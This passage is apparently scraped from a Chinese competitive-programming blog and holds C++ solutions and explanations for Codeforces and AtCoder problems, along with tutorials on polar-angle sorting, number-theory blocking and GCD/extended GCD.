\u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; ll num[M]; int main() { int t = read(); while(t --) { ll n = read(), h = read(); for(int i = 0; i \u0026lt; n; i ++) { num[i] = read(); } sort(num, num + n); ll a = num[n - 1], b = num[n - 2]; ll ans = h / (a + b); ans *= 2; if(h % (a + b) \u0026gt; 0 \u0026amp;\u0026amp; h % (a + b) \u0026gt; a) ans += 2; else if (h % (a + b) \u0026gt; 0 \u0026amp;\u0026amp; h % (a + b) \u0026lt;= a) ans += 1; cout \u0026lt;\u0026lt; ans \u0026lt; B. Hemose Shopping 题意是间距 $ \\ge x$ 的元素才能交换。只要能交换就可以到能交换的任意位置必然能够排序，但是不能交换的位置上的元素无法改变，所有只需要判断无法改变的位置上的元素是否是正确的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; int num[M], tmp[M]; int main() { int t = read(); while(t --) { ll n = read(), x = read(); for(int i = 0; i \u0026lt; n; i ++) { num[i] = read(); tmp[i] = num[i]; } sort(tmp, tmp + n); bool flag = true; for(int i = 0 ; i \u0026lt; n; i ++) { if(i \u0026lt; x \u0026amp;\u0026amp; n - i - 1 \u0026lt; x \u0026amp;\u0026amp; tmp[i] != num[i]) flag = false; } if(flag) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } C. Bakry and Partitioning\n如果一棵树的异或和为 $ 0 $ 那么，我们必然可以把这课树划分成异或和相等的两部分，若不为 $ 0 $ 则判断是有两棵以上子树的异或和为与总异或和相等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) {if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) {x = x * 10 + ch - \u0026#39;0\u0026#39;;ch = getchar();} return x * f; } const int M = 1e5 + 7; struct Node { int to, nxt; } tr[M * 2]; int head[M], idx, num[M], xxor[M], all, cnt; void add(int u, int v) { tr[idx] = {v, head[u]}; head[u] = idx ++; } int dfs(int u, int fa) { int now = num[u]; for(int i = head[u]; ~i; i = tr[i].nxt) { int j = tr[i].to; if(j != fa) { now ^= dfs(j, u); } } if(now == all) { cnt ++; return 0; } return xxor[u] = now; } int main() { int t = read(); while(t --) { idx = 0, all = 0, cnt = 0; ll n = read(), k = read(); for(int i = 1; i \u0026lt;= n; i ++) { num[i] = read(); head[i] = -1; all ^= num[i]; } for(int i = 1; i \u0026lt; n ; i ++) { int u = read(), v = read(); add(u, v); add(v, u); } dfs(1, - 1); if(all == 0) { cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; } else { dfs(1, -1); if(k \u0026gt;= 3 \u0026amp;\u0026amp; cnt \u0026gt; 2) cout \u0026lt;\u0026lt; \u0026#34;YES\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34;NO\u0026#34; \u0026lt;\u0026lt; endl; } } return 0; } D. Hemose in ICPC ? 题目只给了 12次的查询机会，而 $n = 1000$ ，所有可以多半是用二分来做的，但是这是一棵树不好二分，所有正解是对树进行一层求边的 DFS 序后二分，因为对边进行 DFS 序后，每一段区间在原本的树上都是连续的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;set\u0026gt; #define INF 0x3f3f3f3f using namespace std; typedef long long ll; ll read() { ll x = 0, f = 1; char ch = getchar(); while (ch \u0026lt; \u0026#39;0\u0026#39; || ch \u0026gt; \u0026#39;9\u0026#39;) { if (ch == \u0026#39;-\u0026#39;) f = -1; ch = getchar();} while (ch \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; ch \u0026lt;= \u0026#39;9\u0026#39;) { x = x * 10 + ch - \u0026#39;0\u0026#39;, ch = getchar();} return x * f; } const int M = 1e3 + 7; typedef pair\u0026lt;int, int\u0026gt; PII; vector\u0026lt;int\u0026gt; tr[M]; vector\u0026lt;PII\u0026gt; edge; int in[M], out[M], cnt = 1; void dfs(int now, int fa) { edge.push_back({now, fa}); for(int i = 0; i \u0026lt; (int)tr[now].size(); i ++) { if(fa != tr[now][i]) { dfs(tr[now][i], now); } } } void query(int n, int ans) { int l = 1, r = n - 1; // 第一个点不会是答案 while(true) { if(l == r) { printf(\u0026#34;! %d %d\\n\u0026#34;, edge[l].first, edge[l].second); break; } int mid = l + r \u0026gt;\u0026gt; 1; set\u0026lt;int\u0026gt; st; for(int i = l; i \u0026lt;= mid; i ++) st.insert(edge[i].first), st.insert(edge[i].second); cout \u0026lt;\u0026lt; \u0026#34;? \u0026#34; \u0026lt;\u0026lt; st.size(); for(auto i : st) cout \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; i ; cout \u0026lt;\u0026lt; endl; int now = read(); if(now == ans) r = mid; else l = mid + 1; } } int main() { int n = read(); for(int i = 1; i \u0026lt; n ; i ++) { int u = read(), v = read(); tr[u].push_back(v); tr[v].push_back(u); } dfs(1, 1); cout \u0026lt;\u0026lt; \u0026#34;? \u0026#34; \u0026lt;\u0026lt; n; for(int i = 1; i \u0026lt;= n; i ++) cout \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; i; cout \u0026lt;\u0026lt; endl; int ans = read(); query(n, ans); return 0; } ","date":"2021-10-07T12:59:02+08:00","permalink":"https://example.com/p/cf746/","title":"Cf746"},{"content":"极角排序 方法 1 : 直接计算极角 极坐标与直角坐标转换公式有 $\\tan \\theta = \\dfrac{y}{x}$ ，在 \u0026lt;cmath\u0026gt; 中有函数 atan(y, x) ，可以直接计算 (x, y) 的极角，值域是 $(-\\pi,\\pi]$ ，可以直接使用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; struct Point { ld x, y; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0) : x(x), y(y) {} }p[M]; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } sort(p + 1, p + n + 1, [\u0026amp;](auto p1, auto p2) { return atan2(p1.y, p1.x) \u0026lt; atan2(p2.y, p2.x); }); for (int i = 1; i \u0026lt;= n; ++i)cout \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p[i].x \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p[i].y \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; atan2(p[i].y, p[i].x) \u0026lt;\u0026lt;\u0026#39;)\u0026#39; \u0026lt;\u0026lt; endl; return 0; } 这种极角排序，有一下几点需要注意：\n排序完之后是按照 (三（不含负 $x$ 轴）、四、一、二) 的象限顺序。\natan(y,x) 是存在精度误差的可能会被卡。\n方法二 : 叉积 + 所在象限排序 通过两向量象限关系 + 叉积关系来排序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; struct Point { ld x, y; int id; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0) :x(x), y(y){} Point operator-(const Point\u0026amp; b){return Point(x - b.x, y - b.y);} ld get_length() {return sqrt(x * x + y * y);} }p[M]; ld cross(Point a, Point b) { return a.x * b.y - a.y * b.x; } int qua(Point p) { return (p.y \u0026lt; 0) \u0026lt;\u0026lt; 1 | (p.x \u0026lt; 0) ^ (p.y \u0026lt; 0);} // 求象限(0, 1, 2, 3) bool cmp(Point a, Point b) { // cmp 写法 return qua(a) \u0026lt; qua(b) || qua(a) == qua(b) \u0026amp;\u0026amp; (cross(a, b) \u0026gt; 0.0); } bool cmp2(const Point \u0026amp;a, const Point \u0026amp;b)//先按象限排序，再按极角排序，再按远近排序 { if (a.y == 0 \u0026amp;\u0026amp; b.y == 0 \u0026amp;\u0026amp; a.x*b.x \u0026lt;= 0)return a.x\u0026gt;b.x; if (a.y == 0 \u0026amp;\u0026amp; a.x \u0026gt;= 0 \u0026amp;\u0026amp; b.y != 0)return true; if (b.y == 0 \u0026amp;\u0026amp; b.x \u0026gt;= 0 \u0026amp;\u0026amp; a.y != 0)return false; if (b.y*a.y \u0026lt;= 0)return a.y\u0026gt;b.y; return cross(a,b) \u0026gt; 0 || (cross(a,b) == 0 \u0026amp;\u0026amp; a.y \u0026gt; b.y); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } Point c = Point(0, 0); // 原点（可更改） sort(p + 1, p + n + 1, [\u0026amp;](auto v1, auto v2) { return qua(v1 - c) \u0026lt; qua(v2 - c) || qua(v1 - c) == qua(v2 - c) \u0026amp;\u0026amp; (cross(v1 - c, v2 - c) \u0026gt; 0.0); }); for (int i = 1; i \u0026lt;= n; ++i)cout \u0026lt;\u0026lt; \u0026#39;(\u0026#39; \u0026lt;\u0026lt; p[i].x \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p[i].y \u0026lt;\u0026lt;\u0026#39;)\u0026#39; \u0026lt;\u0026lt; endl; return 0; } 注意点：\n在点为整数的情况下精度较高，速度可能比上面的方法快。\n排序后结果是按照（一（含正 $x$ 轴）、二、三、四）坐标轴排列。\n例题 1 ：C. Nearest vectors 模板题，极角排序后求相邻两向量的夹角即可，最后输出最小对的坐标。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 #include\u0026lt;iostream\u0026gt; #include\u0026lt;cmath\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; typedef long double ld; const int M = 1e5 + 7; const ld PI = acos(-1); struct Point { ld x, y; int id; Point(const ld \u0026amp;x = 0, const ld \u0026amp;y = 0, const int \u0026amp;id = 0) :x(x), y(y), id(id) {} Point operator-(const Point\u0026amp; b){return Point(x - b.x, y - b.y);} ld get_length() {return sqrt(x * x + y * y);} }p[M]; ld dot(Point a, Point b) { return a.x * b.x + a.y * b.y; } ld cross(Point a, Point b) { return a.x * b.y - a.y * b.x; } double get_angle(Point a, Point b) { // 求两向量夹角 return acos(dot(a, b) / a.get_length() / b.get_length()); // 弧度 -\u0026gt; (* 180 / PI) 角度 } ld theta(Point p) { return atan2(p.y, p.x);} int qua(Point p) { return (p.y \u0026lt; 0) \u0026lt;\u0026lt; 1 | (p.x \u0026lt; 0) ^ (p.y \u0026lt; 0);} // 求象限 bool cmp(Point a, Point b) { return qua(a) \u0026lt; qua(b) || qua(a) == qua(b) \u0026amp;\u0026amp; (cross(a, b) \u0026gt; 0.0); } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for(int i = 1; i \u0026lt;= n; i ++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y, i); } sort(p + 1, p + n + 1, cmp); p[n + 1] = p[1]; pair\u0026lt;int, int\u0026gt; ans = {1, 2}; ld mmax = 2 * PI + 1; for(int i = 1; i \u0026lt;= n; i ++) { ld now = theta(p[i+1]) - theta(p[i]); // 其实只是为了处理 两向量一个在第二象限，一个在第三象限的情况 // 为了处理 atan 的边界 if(now \u0026lt; 0) now += 2 * PI; if(now \u0026lt; mmax) { mmax = now; ans = {p[i].id, p[i+1].id}; } } printf(\u0026#34;%d %d\\n\u0026#34;, ans.first, ans.second); return 0; } 例题 2 ：[USACO10OPEN]Triangle Counting G - 洛谷 题意：给出平面上的很多点，求包含原点的三角形的个数。\n思路：先求出一共可以组成多少种三角形，使用组合数 $\\binom{n}{3} $，再减去不满足条件的三角形，可以发现，对于任何一个不满足条件的三角形必然存在，其中两个顶点与原点组成的直线后其余两个点观点都在同侧。在极角排序后，我们可以遍历每个点（看作以原点为起点向量），求出与这个点夹角小于 $\\pi$ 的个数，也就是减去 $\\binom{n}{2}$ ，就是答案了，这里可以使用二分或者双指针算法，每次只需要减去一边的不满足条件的即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long double ld; typedef long long ll; typedef pair\u0026lt;ld, int\u0026gt; PLI; const int M = 1e5 + 7; const ld PI = acos(-1); struct Point { ll x, y; Point(ll x = 0, ll y = 0) : x(x), y(y) {} } p[M]; PLI angle[M]; bool check(int a, int b) { return p[a].x * p[b].y \u0026gt;= p[a].y * p[b].x; //逆时针旋转小于 PI (本质上是叉积) } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); angle[i] = {atan2(y, x), i}; } sort(angle + 1, angle + 1 + n); // 极角排序 ll ans = 1LL * n * (n - 1) * (n - 2) / 6; ll now = 0; // 当前满足条件的点的个数 for (int l = 1, r = 2; l \u0026lt;= n; l++) { while (check(angle[l].second, angle[r].second)) { now++; r = r % n + 1; // r ++，外加取模，一举两得 } ans -= now * (now - 1) / 2; now--; } printf(\u0026#34;%lld\\n\u0026#34;, ans); return 0; } 例题 3 : [POI2008]TRO-Triangles - 洛谷 题意：给定平面上的一些点，求这些点能组成的所有三角形的面积之和，三点同一直线上面积算作 $0$ 。\n分析：\n题目的数据范围是 $n \\le 3000$，由组合数可知，暴力作法的时间复杂度为 $O(n^3)$ 是过不了的，所以我们对这么多的点进行分析。\n已知三点 $A(x_a,y_a),B(x_b,y_b),C(x_c,y_c)$\n则它们所围成的三角形的面积可以这么算 ：\n$$ \\begin{aligned} S \u0026amp;= \\dfrac{1}{2}\\overrightarrow{AB} \\times \\overrightarrow{AC} \\\\ \u0026amp;= \\dfrac{1}{2}(x_b - x_a, y_b - y_a) \\times (x_c - x_a, y_c - y_a) \\\\ \u0026amp;= \\dfrac{1}{2}(x_b-x_a)(y_c-y_a) - (y_b - y_a)(x_c - x_a) \\\\ \u0026amp;= \\dfrac{1}{2}(x_b y_c + x_a y_a - x_a y_c - x_b y_a) - (y_b x_c + y_a x_a - y_b x_a -y_a x_c) \\\\ \u0026amp;= \\dfrac{1}{2}x_a(y_b - y_c) + y_a(x_c - x_b) \\end{aligned} $$\n所以我们可以先对所有点根据 $x$ ，$y$ （从小到大）双关键字排序，然后确定第一个点，也就算遍历一遍每个点，然后对后面的点极角排序，这样的话叉积结果可以直接是正数，然后遍历两个点的时间复杂度太高，所以我们就遍历其中一个点，另一个点则可以使用后缀和代替。\n$$ S = \\dfrac{1}{2}x_a(y_b - \\sum y_c) + y_a(\\sum x_c - x_b) $$\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;iostream\u0026gt; using namespace std; typedef long double ld; typedef long long ll; typedef pair\u0026lt;int, int\u0026gt; PII; const int M = 3e3 + 7; struct Point { int x, y; Point(int x = 0, int y = 0) : x(x), y(y) {} } p[M], add[M]; bool cmp(Point a, Point b) { return a.x == b.x ? a.y \u0026lt; b.y : a.x \u0026lt; b.x; } bool cmp_angle(Point a, Point b) { return 1LL * a.x * b.y \u0026gt; 1LL * a.y * b.x; } int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 1; i \u0026lt;= n; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); p[i] = Point(x, y); } ll ans = 0; sort(p + 1, p + n + 1, cmp); // 对各个点按照 x 坐标排序 for(int i = 1; i \u0026lt;= n; ++i) { int cnt = 0; for(int j = i + 1; j \u0026lt;= n; j ++) { // 求到当前点的向量 add[cnt].x = p[j].x - p[i].x; add[cnt].y = p[j].y - p[i].y; cnt ++; } ll sumx = 0, sumy = 0; sort(add, add + cnt, cmp_angle); // 对这些项目极角排序（这样面积都为整数） for(int j = 0; j \u0026lt; cnt; j ++) sumx += add[j].x , sumy += add[j].y; // 求后缀和 for(int j = 0; j \u0026lt; cnt; j ++) { // 遍历第二个点 sumx -= add[j].x, sumy -= add[j].y; // 第三个点的和 ans += sumy * add[j].x - sumx * add[j].y; } } printf(\u0026#34;%lld.%lld\u0026#34;, ans/2, (ans \u0026amp; 1) * 5); // 小数处理 return 0; } ","date":"2021-09-30T15:35:31+08:00","permalink":"https://example.com/p/polaranglesort/","title":"PolarAngleSort"},{"content":"数论分块 引入 给定一个正整数 $n$，求解 $$ \\sum_{i = n}^{n} \\left \\lfloor \\dfrac{n}{i} \\right \\rfloor $$ 首先易想到暴力做法，时间复杂度为 $O(n)$，但通过打表 $n = 10$\ni 1 2 3 4 5 6 7 8 9 10 $\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor$ 10 5 3 2 2 1 1 1 1 1 我们可以发现对于 $i$ 的一段区间 ，$\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor$ 的值都是相同的。如果我们能一次计算一段的值，那么复杂度将会降低。\n分块 设一段的左端点为 $L_{i}$，右端点为 $R_{i}$，则 $L_{i+1} = R_{i} + 1$。如何找到每一段的 $L$ 和 $R$ ？使得 $$ \\left \\lfloor \\dfrac{n}{L} \\right \\rfloor = \\left \\lfloor \\dfrac{n}{R} \\right \\rfloor $$ 设 $\\left \\lfloor \\dfrac{n}{L} \\right \\rfloor = k$，$R = L + d$，得到 $\\left \\lfloor \\dfrac{n}{L+d} \\right \\rfloor = k$，即 $$ \\begin{aligned} n \u0026amp;= Lk + p, \\ 0 \\leqslant p \u0026lt; L \\\\ n \u0026amp;= (L + d)k + q, \\ 0 \\leqslant q \u0026lt; L \\end{aligned} $$ 此时 $d_{max} = \\left \\lfloor \\dfrac{p}{k} \\right \\rfloor$ 带入 $R = L + d$ 得到 $$ \\begin{aligned} R \u0026amp;= L + \\left \\lfloor \\dfrac{p}{k} \\right \\rfloor \\\\ \u0026amp;= L + \\left \\lfloor \\dfrac{n - Lk}{k} \\right \\rfloor \\\\ \u0026amp;= \\left \\lfloor \\frac{n}{\\left \\lfloor \\dfrac{n}{L}\\right \\rfloor}\\right \\rfloor \\end{aligned} $$ 现在我们已经可以求出每一段分块的区间了，那么每一段的贡献为 $(R−L+1)\\times \\left \\lfloor \\dfrac{n}{L}\\right \\rfloor$\n复杂度证明 数论分块的复杂度为 $O(2\\sqrt{n})$，我们将证明： $$ \\forall n \\in \\mathbb{N}, \\left|\\left \\lbrace \\lfloor \\frac{n}{d} \\rfloor \\mid d \\in \\mathbb{N},d\\leq n \\right \\rbrace \\right| \\leq \\lfloor 2\\sqrt{n} \\rfloor $$ $$ \\forall n \\in N_{+}, \\left|\\left\\{ \\lfloor\\frac{n}{d}\\rfloor\\mid d \\in N_{+},d\\leq n \\right\\}\\right|\\leq\\lfloor 2\\sqrt{n} \\rfloor $$\n略证：\n对于 $d \\leqslant \\lfloor \\sqrt{n} \\rfloor$，$\\lfloor \\frac{n}{d} \\rfloor$ 有 $\\lfloor \\sqrt{n} \\rfloor$ 种取值。\n对于 $d \u0026gt; \\lfloor \\sqrt{n} \\rfloor$，有$\\lfloor \\frac{n}{d} \\rfloor \\leqslant\\lfloor \\sqrt{n} \\rfloor$ ，则也有 $\\lfloor \\sqrt{n} \\rfloor$ 种取值。\n练习与思考 P1403 约数研究 求 $\\sum_{i=1}^{n}f(i)$，$f(i)$ 代表正数 $i$ 的约数的个数。\n思路很简单就是，$1\\dots n$ 中间 $i$ 作为约数出现的次数为 $\\left \\lfloor\\dfrac{n}{i} \\right \\rfloor$\n那么答案就是 $$ \\sum_{i=1}^{n}\\left \\lfloor \\dfrac{n}{i} \\right \\rfloor $$\n1 2 3 4 5 6 7 8 ll solve(int n) { ll ans = 0; for (ll l = 1, r = 0; l \u0026lt;= n; l = r + 1) { r = n / (n / l); ans += n / l * (r - l + 1); } return ans; } P2424 约数和 题意简单的说就是求 $$ \\sum_{i = 1}^{y} f(i) - \\sum_{i = 1}^{x} f(i), \\ y \u0026gt; x $$ 其中的 $$ f(x) = \\sum_{i|x}i $$ 我们要求 $\\sum_{i = 1}^{n} f(i)$，也就是求每个约数在 $1\\dots n$ 中的出现次数（也就是上题）再乘上约数本身，即 $$ \\sum_{i = 1}^{n} i \\times \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor $$ 在上一题的基础上再乘上约数本身，也就是对于每一段 $[L\\dots R]$ ，求 $$ \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor \\times \\sum_{i = L}^{R} i $$ 由高斯求和得 $$ \\left \\lfloor\\dfrac{n}{i} \\right \\rfloor \\times (L + R) \\times (R - L + 1) / 2 $$\n1 2 3 4 5 6 7 8 ll solve(int n) { ll ans = 0; for (ll l = 1, r = 0; l \u0026lt;= n; l = r + 1) { r = n / (n / l); ans += n / l * (l + r) * (r - l + 1) / 2; } return ans; } 类似得题目还有：\nP2261 [CQOI2007]余数求和\n","date":"2021-08-10T00:00:00Z","permalink":"https://example.com/p/%E6%95%B0%E8%AE%BA%E5%88%86%E5%9D%97/","title":"数论分块"},{"content":"AtCoder Beginner Contest 211 A - Blood Pressure 水题，按题目给的式子输出即可\n1 2 3 4 5 6 7 8 9 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; double c = ((double)a - b) / 3 + b; printf(\u0026#34;%lf\\n\u0026#34;, c); return 0; } B - Cycle Hit 暴力判断\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; bool st[4]; int main() { string s[4]; for (int i = 0; i \u0026lt; 4; i++) cin \u0026gt;\u0026gt; s[i]; for (int i = 0; i \u0026lt; 4; i++) { if (s[i] == \u0026#34;H\u0026#34;) st[0] = true; if (s[i] == \u0026#34;2B\u0026#34;) st[1] = true; if (s[i] == \u0026#34;3B\u0026#34;) st[2] = true; if (s[i] == \u0026#34;HR\u0026#34;) st[3] = true; } bool flag = true; for (int i = 0; i \u0026lt; 4; i++) if (!st[i]) flag = false; if (flag) cout \u0026lt;\u0026lt; \u0026#34;Yes\u0026#34; \u0026lt;\u0026lt; endl; else cout \u0026lt;\u0026lt; \u0026#34; No\u0026#34; \u0026lt;\u0026lt; endl; return 0; } C - chokudai 简单 $dp$，$dp[i][j]$ 代表到 $i$ 位置前缀长度为 $j$ 的个数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 1e5 + 7, mod = 1e9 + 7; ll dp[M][8]; char s[M]; // c, h, o, k, u, d, a, i string cmp = \u0026#34; chokudai\u0026#34;; int main() { cin \u0026gt;\u0026gt; s + 1; int len = strlen(s + 1); for (int i = 1; i \u0026lt;= len; i++) { dp[i - 1][0] = 1; for (int j = 1; j \u0026lt; 9; j++) { if (s[i] == cmp[j]) { dp[i][j] = (dp[i - 1][j] + dp[i - 1][j - 1]) % mod; } else dp[i][j] = dp[i - 1][j]; } } cout \u0026lt;\u0026lt; dp[len][8] \u0026lt;\u0026lt; endl; return 0; } D - Number of Shortest paths 由于边长的权值为 $1$ ，所以可以通过 $bfs$ 来求解最短路的条数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int M = 2e5 + 7, mod = 1e9 + 7; struct Node { int to, nxt; } tr[M * 2]; int idx, head[M]; int cnt[M]; ll num[M]; bool st[M]; void add(int u, int v) { tr[idx] = {v, head[u]}; head[u] = idx++; } void bfs() { queue\u0026lt;int\u0026gt; q; q.push(1); num[1] = 1; st[1] = true; while (q.size()) { int now = q.front(); q.pop(); for (int i = head[now]; ~i; i = tr[i].nxt) { int j = tr[i].to; if (st[j] \u0026amp;\u0026amp; cnt[j] == cnt[now] + 1) { num[j] = (num[j] + num[now]) % mod; } else if (!st[j]) { cnt[j] = cnt[now] + 1; num[j] = num[now]; st[j] = true; q.push(j); } } } } int main() { memset(head, -1, sizeof head); int n, m; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;n, \u0026amp;m); for (int i = 1; i \u0026lt;= m; i++) { int x, y; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;x, \u0026amp;y); add(x, y), add(y, x); } bfs(); printf(\u0026#34;%lld\\n\u0026#34;, num[n]); return 0; } ","date":"2021-07-25T15:13:43+08:00","permalink":"https://example.com/p/abc211/","title":"ABC211"},{"content":"GCD \u0026amp; EXGCD GCD （Greatest Common Divisor）即最大公约数。\n欧几里得算法 我们已知两个数 $a$ ，$b$ ；假设 $a \u0026gt; b$，有两种情况：\n$b \\mid a$​ ，即 $\\gcd (a, b) = b$。 $a = b\\times k + a\\bmod b$​​​​​​ ，此时我们要证明 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$​​​​ 。 设 $$ a = b\\times k + c，(c = a \\bmod b) $$ 设 $d \\mid a,\\ d\\mid b$​​​ ；则 $$ \\dfrac{c}{d} = \\dfrac{a}{d} - k\\dfrac{b}{d} $$ 因为 $\\dfrac{a}{d} $​​ 和 $\\dfrac{bk}{d}$​​​ 都为整数，所以 $\\dfrac{c}{d}$​​​ 也是整数，即 $d \\mid c$​​ 。所以对于所有的 $a, b$​​​ 的公约数，都是 $a\\bmod b$​​ 的约数。\n重新设 $d \\mid b, d \\mid c$ $$ \\dfrac{a}{d} = k\\dfrac{b}{d} + \\dfrac{c}{d} $$ 因为 $\\dfrac{c}{d} $​​​​​​ 和 $\\dfrac{bk}{d}$​​​​​​ 都为整数，所以 $\\dfrac{a}{d}$​​​​​​ 也是整数，即 $d \\mid a$​​​​​​ 。所以对于所有的 $b, a \\bmod b$​​ 的公约数，都是 $a$​​​​​​​ 的约数。\n两式的公约数是相同的，那么他们的最大公约数也相同。\n得到了 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$ 。\n1 2 3 int gcd(int a, int b){ return b ? gcd(b, a % b) : a; } 对应的 LCM 也很简单\n1 2 3 int lcm(int a, int b){ return (ll)a * b / gcd(a, b); } 扩展欧几里得 EXGCD（Extended Euclidean algorithm）扩展欧几里得算法。常用于求 $ax + by = \\gcd(a, b)$​​​ 的通解。\n设 $$ \\begin{aligned} ax_{1} + by_{1} \u0026amp;= \\gcd(a, b)\\\\ bx_{2} + (a \\bmod b) y_{2} \u0026amp;= \\gcd(b, a \\bmod b) \\end{aligned} $$ 前面已经证明 $\\gcd(a, b) = \\gcd(b, a\\bmod b)$\n且 $$ a \\bmod b = a - \\left \\lfloor \\dfrac{a}{b} \\right \\rfloor \\times b 